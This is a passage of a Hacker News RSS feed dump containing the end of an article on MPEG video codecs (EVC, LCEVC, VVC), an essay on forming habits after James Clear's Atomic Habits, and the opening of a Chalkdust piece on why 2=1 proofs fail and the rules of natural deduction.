<figure><img data-attachment-id="95" data-permalink="https://ottverse.com/evc-block-diagram-2019/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=700%2C336&amp;ssl=1" data-orig-size="700,336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="evc-block-diagram-2019" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=700%2C336&amp;ssl=1" loading="lazy" width="700" height="336" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=700%2C336&amp;is-pending-load=1#038;ssl=1" alt="Block Diagram of the EVC Codec Presented at IBC2019 showing the Enhancement Layer tools in gray boxes" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?w=700&amp;ssl=1 700w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=300%2C144&amp;ssl=1 300w" data-lazy-sizes="(max-width: 700px) 100vw, 700px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=700%2C336&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Block Diagram of the EVC Codec Presented at IBC2019 showing the Enhancement Layer tools in gray boxes</figcaption></figure>



<p>It is also interesting to note the following sentence from the&nbsp;<a href="https://www.ibc.org/download?ac=10463" target="_blank" rel="noopener">IBC 2019 paper on EVC</a>&nbsp;and I quote,</p>



<blockquote><p>No considerations have been taken on licensing aspects of the technology other than a requirement for FRAND commitment by the contributors.&nbsp;<strong>Commercial aspects, and in particular, licensing aspects have been handled externally and independently of MPEG.</strong></p></blockquote>



<p>They’ve been handled, huh? Okay cool, but I still cross my fingers and say a prayer when I hear “MPEG” and “Licensing” in the same sentence.</p>



<p>Let’s hope that EVC is adopted and supported in the industry quickly – its a good concept and means well.</p>



<p>In a future article, we will do a deep dive into the tools supported in the Base and the Main layers of EVC.</p>



<p><strong>Reference</strong>&nbsp;–&nbsp;<a href="https://www.ibc.org/download?ac=10463" target="_blank" rel="noopener">The Emerging MPEG-5 EVC Standard – Applications, Technology, and Results presented at IBC 2019</a></p>



<h2 id="low-complexity-enhancement-video-coding---lcevc-mpeg-5-part-2"><span id="Low_Complexity_Enhancement_Video_Coding_%E2%80%93_LCEVC_(MPEG5_Part_2)"></span>Low Complexity Enhancement Video Coding – LCEVC (MPEG-5 Part 2)<span></span></h2>



<p>MPEG-5 Part 2 LCEVC is being introduced with the aim of increased compression efficiency for existing codecs at little or no-increase in coding complexity by using a base bitstream and an enhancement bitstream.</p>



<p>The LCEVC codec’s output is essentially a combination of a “base bitstream” produced by an existing video codec such as AVC, HEVC, VP9, AV1, etc. along with enhancement layers that can be used conditionally to improve the quality of the video.</p>



<p>If the decoder/end-device supports LCEVC, the enhancement layers are decoded, else, the base codec alone is used to decode the bitstream and the video is rendered to the user. This ensures backward-compatibility and encourages roll-out of the LCEVC codec without the fear of breaking the end-user’s experience.</p>



<p>This concept is nicely captured in the figure below taken from Guido Meardi’s&nbsp;<a href="https://www.itu.int/en/ITU-T/Workshops-and-Seminars/20191008/Documents/Guido_Meardi_Presentation.pdf" target="_blank" rel="noopener">presentation</a>&nbsp;at the ITU Workshop on the Future of Media in Geneva.</p>



<figure><img data-attachment-id="124" data-permalink="https://ottverse.com/lcevc-layers-video-coding/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" data-orig-size="800,354" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-layers-video-coding" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" loading="lazy" width="800" height="354" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" alt="lcevc mpeg5 part2" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=300%2C133&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=768%2C340&amp;ssl=1 768w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>For further details on LCEVC, please read </p>



<ul><li>our&nbsp;<a href="https://ottverse.com/lcevc-mpeg5-part2-low-complexity-enhancement-video-coding-guide/">architecture deep-dive</a>&nbsp;on LCEVC.</li><li><a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">comparison of LCEVC against H.264/AVC.</a></li></ul>



<p>On a final note, V-Nova has been instrumental in driving the LCEVC standard through their research and work on the Perseus codec. More information on that&nbsp;<a href="https://www.v-nova.com/v-nova-video-compression-technology/" target="_blank" rel="noopener">here</a>.</p>



<h2 id="what-next"><span id="What_Next"></span>What Next?<span></span></h2>



<p>I think 2020 and 2021 present great challenges and opportunities for the field of video compression.</p>



<p>With consumption increasing due to the COVID-19 situation, most content providers are under the gun to reduce their streaming costs. Dropping the bitrates is one way of reducing your streaming costs, but, conversely, it will be hard to compete with the likes of Netflix, Hulu, HBO, Peacock, fuboTV, DAZN with poor video quality.</p>



<p>If the compression experts can pull off VVC’s goals of 30% bitrate savings over HEVC, then it will be a huge win. The only thing they’ll have to ensure is that they don’t blow their foot off with licensing issues (<em>a-la-HEVC</em>). If things work out properly, VVC should be a good competitor to AV1 especially at high resolutions such as 4K and 8K.</p>



<p><em><strong>However</strong></em>, that being said, I think that among the three codecs …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/">https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/</a></em></p>]]>
            </description>
            <link>https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948460</guid>
            <pubDate>Sat, 31 Oct 2020 01:44:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Habits Maketh the Man (and Un-Maketh Him, Too)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948444">thread link</a>) | @stanrivers
<br/>
October 30, 2020 | https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh | <a href="https://web.archive.org/web/*/https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h6><em>Disclosure: Links to Amazon are generally affiliated links. As an Amazon Associate, we earn from qualifying purchases, meaning a commission may be generated on purchased items.</em></h6><blockquote><p><em>It is so easy to overestimate the importance of one defining moment and underestimate the value of making small improvements on a daily basis. Too often, we convince ourselves that massive success requires massive action.</em></p><p><em>- James Clear, Atomic Habits</em></p></blockquote><p><em>This post was inspired by&nbsp;<a href="https://amzn.to/3cUbKP1">Atomic Habits</a>, written by&nbsp;<a href="https://jamesclear.com/">James Clear</a>. Detailed notes and quotes can be found&nbsp;<a href="https://www.butwhatfor.com/atomic-habits-clear/">here</a>. Unattributed quotes below are from Clear’s writing.</em></p><p>Life is complex. Chaotic. Surprising. Uncertain. It is full of new things — many of which can kill us. And that’s a problem, because we humans tend to prefer not dying. Fortunately, we have been practicing surviving for quite some time and have developed a way to&nbsp;<a href="https://medium.com/@beatsbyvanity/jordan-b-peterson-how-to-organize-your-life-for-success-d49cf42569ba">cut down on that chaos with a bit of order</a>: the ability to form habits. However, and unfortunately for those humans looking for more in life than just survival, these habits often have more control over us than we have control over them.</p><p>So what are habits and why do they control us?&nbsp;<a href="https://www.thebehavioralscientist.com/blog/your-house-is-holding-you-back-seriously">Jason Hreha</a>, a behavioral scientist who writes about life and business, summarizes that “habits are, simply, reliable solutions to recurring problems in our environment.” They are unconscious programs that free up our conscious mind to solve those non-recurring new problems that are constantly thrown our way. It’s too mentally expensive to try to figure out what you should do every day when you get home from work — its much easier to have a program that loads without you knowing and tells you to change clothes. Putting on running shoes loads the running program. Smelling alcohol loads the drinking program. The important take away is that whether you notice them or not, the habits are running. This means that, for better or for worse, your habits are in charge of who you are in the future.</p><p>Fortunately, humans are conscious (which at times has its benefits). We can consciously uninstall bad old habits while installing new, better ones. This can push us towards a better version of our future self. In order to do so, Clear suggests we need to realize that 1) habits are best changed by a change in your&nbsp;<em>targeted</em>&nbsp;identity as opposed to goals alone and 2) your system of habits is far more important than your goals — you do not rise to the level of your goals, but instead fall to the level of your systems. These two points are also interconnected — our future identity is a lagging indicator of today’s systems. The only way you are a healthy person today is to have followed a system leading up to now that was that of a healthy person.</p><p>It is much easier for a&nbsp;<em>runner</em>&nbsp;to wake up early in the morning and head out into the rain before work than it is for a businessman wanting to get in shape. A&nbsp;<em>musician</em>&nbsp;can’t help but to find time to practice his violin, but the overloaded college student who wants to be able to play her favorite songs can easily find things get in the way. The runner and musician have no choice but to act in ways that are aligned with who they are. But how do you convince yourself that you are a runner or musician?</p><p>That is where the importance of your system comes into play. People often view themselves as a single entity, but we are in fact a new person every day we wake up. Today’s actions are votes for tomorrow’s me. Smoking a cigarette is a vote to be a future cigarette smoker. Remembering to kiss your wife in the morning is a vote to be a future loving husband. In the short term, you need the willpower to drive you. Eventually, the need for willpower falls away because your identity compels you into action. That sounds nice, for sure, but how does this all actually work in practice?</p><p>The first step is understanding how habits form — and they form thanks to the&nbsp;<a href="https://www.brainfacts.org/thinking-sensing-and-behaving/learning-and-memory/2018/motivation-why-you-do-the-things-you-do-082818">dopamine reward system</a>&nbsp;our brains use to program our actions. Clear lays out this “habit loop” as occurring in four phases — there are cues, cravings, responses and rewards. Check out the summary in the notes linked at the top of this post for more specifics, but in short, things in your environment remind your brain of a time it received a dopamine spike, prompting it to replay the actions that caused the dopamine spike most consistently when you were previously in a similar situation.</p><p>So how do you take advantage of your brain’s pathway for programing you? With the simple idea of making it easy. Your brain doesn’t “actually want the habit itself. What you really want is the outcome the habit delivers. The greater the obstacle — that is, the more difficult the habit — the more friction there is between you and your desired end state. This is why it is crucial to make your habits so easy that you’ll do them even when you don’t feel like it.” You need to make the habit cycle easy for those habits voting for the better future you and difficult for those voting for a diminished future you.</p><p>The “environment is the invisible hand that shapes human behavior,” meaning that time and place drive your actions more than anything. When you walk into the kitchen, do you automatically open the refrigerator door without thinking? When you check an email on your phone, do you also open all your social media even though you weren’t planning on it? You need to&nbsp;<a href="https://jamesclear.com/habits-scorecard">take stock of these cues</a>&nbsp;and the associated habits before you can start to make changes. What do you do everyday and what triggers the loading of those programs?</p><p>This is not easy — remember your habits are unconscious. That means even if you are paying attention, you are going to miss habits. But that doesn’t mean you shouldn’t try. And you’ll get better the more you try. As the first step, you need to look at yourself as if you are another person. Take the time to watch yourself, asking “why did I just do that?” It is impossible to do this constantly, but sit down and replay parts of your day when you did things you are proud of and those you are not. See what cues caused you to act as you did. Make sure to notice if another habit was the cue for your action — is there a chain of habits getting you to where you ended up? It takes time, but you’ll learn a lot about yourself.</p><p>After you have figured those out, you need to put yourself in an environment where it is obvious what you want yourself to do. This is where preparation and willpower today can change who you are in the future. It’s almost like time travel — low budget of course, but still effective. Do you need to take medicine every morning? Put it next to your toothbrush. Do you need to wake up in the morning at a certain time. Put an alarm clock in another room that is set to automatically go off. Today’s you just changed tomorrow’s you.</p><p>Another powerful result from understanding your cues is recognizing when something in the environment is the cue for a bad habit. When your friends go out for a smoke, do you always stand up to go when they ask? Now that you have noticed why you are pulling out that pack of cigarettes, you can decide if you are fine with it or would like to change it. Want to override it? Force yourself to pull out flashcards for a new language every time they ask. If you are consistent, a new positive habit has hijacked an old one because you paid attention to how your environment was pulling you along.</p><p>And this all sounds terribly difficult, doesn’t it? That’s the opposite of easy, which is what we were going for. And this is why it is important to start small. Reading a new book every week sounds like a great habit. But it’s an impossibly difficult first step. Start with reading a page a day — see where that takes you. Maybe that is too hard because you are tired when you get home. In that case, start with sitting in a chair holding a book for 2 minutes a day. Make it easy to start. Starting to run is the opposite of fun and easy. Start with putting running shoes on every morning. Eventually you might even step outside. While you are there, maybe your brain might say “why not take a walk?” Walks can take a while, so why not just jog a little? A month later it is second nature to go out and run to the best your health will allow. If you had never started small, a month later you would still just be browsing social media.</p><p>Starting small can also help prevent us from failing into the trap of constantly preparing to act perfectly and, as a result, never acting. To steal from Robert Watson-Watt, “&nbsp;<a href="https://www.irishtimes.com/life-and-style/health-family/don-t-try-to-be-the-best-just-be-good-enough-1.4012523">give them the third best to go on with; the second best comes too late, the best never comes.</a>&nbsp;“ While it is great to wish that you had the perfect workout routine and the best plan of nutrition, if you spend all your time comparing theoretical future versions of you doing those routines, there is no more time left to actually become that future you. And who are you to say that you, who hasn’t even started,&nbsp;<a href="https://www.butwhatfor.com/invert-always-invert-avoid-failure-to-succeed/">can actually discern best from good enough</a>? There is time to perfect things as you go, but if you never get going, there will be nothing to perfect.</p><p>But then there are bound to be days where we don’t have the time or energy — what are we to do then? We are only human, after all. The trick is to continue staving off the need for perfection — consistency is more powerful than perfection. Whatever the habit is, do it even if you have to do it poorly. “Too often, we fall into an all-or-nothing cycle with our habits.” If you have been consistent in studying a new language every day, but today you just don’t have it in you — spend two minutes instead of thirty. Two minutes is success, you have continued to vote for your desired future self and your system is intact. Zero minutes is not.</p><p>What do we do when we mess up and actually can’t even get past zero? It is good to realize that even those that succeed fail at times — so the first step is realizing that all is not lost. But you must be paying attention so that you can catch the mistake before it becomes a new habit. “The first mistake is never the one that ruins you. It is the spiral of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh">https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh</a></em></p>]]>
            </description>
            <link>https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948444</guid>
            <pubDate>Sat, 31 Oct 2020 01:41:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we tell that 2≠1?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948031">thread link</a>) | @samm81
<br/>
October 30, 2020 | http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/ | <a href="https://web.archive.org/web/*/http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<!-- .entry-meta -->
<section id="eu_cookie_law_widget-3">
<div data-hide-timeout="30" data-consent-expiration="180" id="eu-cookie-law">
	<p>

	Privacy &amp; Cookies: This site uses cookies. By continuing to use this website, you agree to their use. <br>
To find out more, including how to control cookies, see here:
		<a href="https://automattic.com/cookies/" rel="nofollow">
		Cookie Policy	</a>
</p></div>
</section><p>What if I told you that $2=1$? You may say I’m wrong. OK, well, what if I proved it to you? We can both agree that there’s an $x$ and a $y$ where $x = y$. From there, <a href="https://math.hmc.edu/funfacts/one-equals-zero/" target="_blank" rel="noopener noreferrer">multiply, subtract, factorise, divide, substitute, divide again</a>, and you get $2 = 1$.</p>
<p>Still not happy? You’re probably unconvinced by my so-called ‘proof’. OK, I say, and, after a minute, hand you a sheet of paper with the following hastily scrawled on it: <a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png"><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=204%2C188" alt="" width="204" height="188" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=300%2C277 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?w=470 470w" sizes="(max-width: 204px) 100vw, 204px" data-recalc-dims="1"></a>It’s better, but you’re still displeased. This time, I’ve made clear what steps I’m taking from $x = y$ to $2 = 1$. However, you point out, I don’t connect any of these steps. Nodding slowly, I take my time and write out a very nice, orderly proof, complete with justifications for each line:<a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png"><img loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=454%2C241" alt="" width="454" height="241" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?w=1200 1200w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=300%2C160 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=1024%2C544 1024w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=768%2C408 768w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=2%2C1 2w" sizes="(max-width: 454px) 100vw, 454px" data-recalc-dims="1"></a></p>
<p>At this point, you spot my mistake: in going from line 4 to 5, I have divided both sides by $x-y$. But we began with the assumption that $x = y$, meaning that $x-y = 0$, and dividing by 0 is not defined! This means that lines 5 to 7 are operating on nonexistent values and are therefore meaningless.</p>
<p>You’re happy with yourself, but something is bothering you. To reveal my mistake, you asked me to be more precise. But why stop here? Because you found what you were looking for? That’s not how truth is found.</p>
<p>My proof, like all proofs, is a path from one statement to another, just as we may follow the path from $ax^2 + bx + c = 0$ to $x = \big(-b \pm \sqrt{b^2-4ac}\big)/{2a}$, or from the existence of rectangles to the transitivity of parallelism (see below). Along this path I have made several intermediate statements, and linked them together with justifications. You found that one of my links is flawed, and you wonder how we know that the others aren’t also wrong. You begin to question foundational principles, wondering, for instance, <a href="https://math.stackexchange.com/a/805939/24325" target="_blank" rel="noopener noreferrer">why we’re even allowed to do the same thing to both sides of an equation</a>.</p>
<p><strong>Euclidean geometry:</strong> For the unfamiliar—Euclidean geometry (standard geometry on a flat surface) rests on 5 assumptions, one of which (the <em>parallel postulate</em>) has historically been regarded as ugly. In attempting to eliminate the parallel postulate, mathematicians have found numerous other statements that are equivalent to it, such as that a rectangle exists or that parallelism is transitive.</p>
<p>You keep digging deeper and deeper, questioning more and more of what you previously took to be correct. Eventually, you come across a piece of mathematics that is perhaps the most beautiful and elegant thing you’ve ever laid your eyes upon: <em>natural deduction</em>.</p>
<h2>Natural deduction</h2>
<p>Natural deduction is one result of asking for deeper and deeper justification when doing maths. A system of natural deduction is a set of very simple, almost irrefutable rules that act to formalise our intuition about what is <em>definitely true</em>.</p>
<div id="attachment_15535"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png"><img aria-describedby="caption-attachment-15535" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?resize=124%2C71" alt="" width="124" height="71" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?w=293 293w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?resize=2%2C1 2w" sizes="(max-width: 124px) 100vw, 124px" data-recalc-dims="1"></a></p><p id="caption-attachment-15535">Reiteration (R): if $P$, then $P$.</p></div>
<p>These rules include such things as <em>reiteration</em>, which simply allows us to repeat ourselves. Precisely, reiteration says that if you know that a statement $P$ is true, then you can conclude that $P$ is true. This is hardly controversial.</p>
<div id="attachment_15536"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png"><img aria-describedby="caption-attachment-15536" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=193%2C120" alt="" width="193" height="120" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?w=422 422w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=300%2C187 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=2%2C1 2w" sizes="(max-width: 193px) 100vw, 193px" data-recalc-dims="1"></a></p><p id="caption-attachment-15536">Conjunction introduction ($\land$I): if $P$ and $Q$ then $P\land Q$.</p></div>
<p>There are two rules for the natural idea of ‘and’. First is the so-called <em>conjunction introduction</em> rule, stating that if you know that $P$ and $Q$ are both true, then you may conclude $P \land Q$, pronounced ‘$P$ and $Q$’. On the other side, we have <em>conjunction elimination</em>, stating that if you know that $P \land Q$ is true, then you may conclude $P$ and also may conclude $Q$.</p>
<div id="attachment_15537"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png"><img aria-describedby="caption-attachment-15537" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=176%2C121" alt="" width="176" height="121" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?w=384 384w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=300%2C205 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=1%2C1 1w" sizes="(max-width: 176px) 100vw, 176px" data-recalc-dims="1"></a></p><p id="caption-attachment-15537">Conjunction elimination ($\land$E): if $P\land Q$, then $P$ and $Q$.</p></div>
<p>These rules don’t feel like they do much besides swapping out ‘and’ for ‘$\land$’; however, doing so is important for formality and precision.</p>
<div id="attachment_15538"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png"><img aria-describedby="caption-attachment-15538" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=172%2C78" alt="" width="172" height="78" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?w=373 373w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=300%2C136 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=2%2C1 2w" sizes="(max-width: 172px) 100vw, 172px" data-recalc-dims="1"></a></p><p id="caption-attachment-15538">Disjunction introduction ($\lor$I): if $P$, then $P\lor Q$.</p></div>
<p>Things start to get tricky with the rules codifying ‘or’. The first, <em>disjunction introduction</em>, tells us that if $P$ is true, then you may conclude $P \lor Q$, pronounced ‘$P$ or $Q$’: if I am hungry, then it’s also true that I’m either hungry or tired.</p>
<div id="attachment_15539"><p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png"><img aria-describedby="caption-attachment-15539" loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=258%2C332" alt="" width="258" height="332" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?w=568 568w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=232%2C300 232w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=1%2C1 1w" sizes="(max-width: 258px) 100vw, 258px" data-recalc-dims="1"></a></p><p id="caption-attachment-15539">Disjunction elimination ($\lor$E): if $P\lor Q$ and from $P$ we can prove $X$ and from $Q$ we can prove $X$, then $X$.</p></div>
<p>The second rule, <em>disjunction elimination</em>, states that if $P \lor Q$ is true, and from $P$ you can prove $X$, and from $Q$ you can prove $X$, then you may conclude $X$. More colloquially, if either $P$ or $Q$ is true, and in both cases $X$ is true, too, then $X$ is true. For example, if I’m either well-rested or well-fed, and being well-rested makes me happy, and being well-fed makes me happy, then I must be happy.</p>
<div id="attachment_15540"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png"><img aria-describedby="caption-attachment-15540" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=222%2C212" alt="" width="222" height="212" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?w=472 472w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=300%2C287 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=1%2C1 1w" sizes="(max-width: 222px) 100vw, 222px" data-recalc-dims="1"></a></p><p id="caption-attachment-15540">Implication introduction ($\Rightarrow$I): if from $P$ we can prove $Q$, then $P\Rightarrow Q$.</p></div>
<p>Then come the rules regarding implication. We have <em>implication introduction</em>, stating that if from $P$ we can prove $Q$, then we may conclude $P \Rightarrow Q$, pronounced ‘$P$ implies $Q$’. And we have <em>implication elimination</em> (also known as <em>modus ponens</em>), which states that if $P \Rightarrow Q$ is true and $P$ is true, then we can conclude $Q$. If the weather being rainy implies that I am cosy, and the weather is rainy, then I must be cosy.</p>
<div id="attachment_15541"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png"><img aria-describedby="caption-attachment-15541" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=220%2C121" alt="" width="220" height="121" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?w=477 477w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=300%2C165 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=2%2C1 2w" sizes="(max-width: 220px) 100vw, 220px" data-recalc-dims="1"></a></p><p id="caption-attachment-15541">Implication elimination ($\Rightarrow$E): if $P\Rightarrow Q$ and $P$, then $Q$.</p></div>
<p>Finally, we come to the most arcane rules, those handling negation. The negation of $P$ is written $\neg P$ and pronounced ‘not $P$’. Before talking about the $\neg P$ rules, however, we must first introduce a new symbol: $\bot$ (pronounced ‘bottom’), which represents impossibility or contradiction. We can then introduce <em>bottom introduction</em>, which states that if both $P$ and $\neg P$ are true, which is absurd (usually… there are systems of logic that admit both $P$ and $\neg P$ at the same time, called <em>paraconsistent</em> logics), then we can conclude $\bot$, to represent this impossibility.</p>
<div id="attachment_15542"><p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png"><img aria-describedby="caption-attachment-15542" loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=195%2C134" alt="" width="195" height="134" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?w=383 383w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=300%2C206 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=1%2C1 1w" sizes="(max-width: 195px) 100vw, 195px" data-recalc-dims="1"></a></p><p id="caption-attachment-15542">Bottom introduction ($\bot$I): if $P$ and $\neg P$, then $\bot$.</p></div>
<p>We’re then able to make use of $\bot$ through <em>negation introduction</em>, which states that if from $P$ we can prove $\bot$, then we can conclude $\neg P$. This is reasonable; if $P$ being true led to a contradiction, then $P$ isn’t true, so $\neg P$ is.</p>
